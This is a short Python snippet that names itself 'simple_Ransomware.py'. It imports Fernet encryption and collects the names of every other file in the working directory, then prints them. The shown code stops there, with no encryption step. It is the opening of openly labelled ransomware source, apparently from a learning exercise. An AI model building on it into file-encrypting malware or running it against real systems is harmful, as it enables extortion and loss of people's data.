import os
from cryptography.fernet import Fernet

files=[]

for file in os.listdir():
    if file=="simple_Ransomware.py":
        continue
    files.append(file)

print(files)
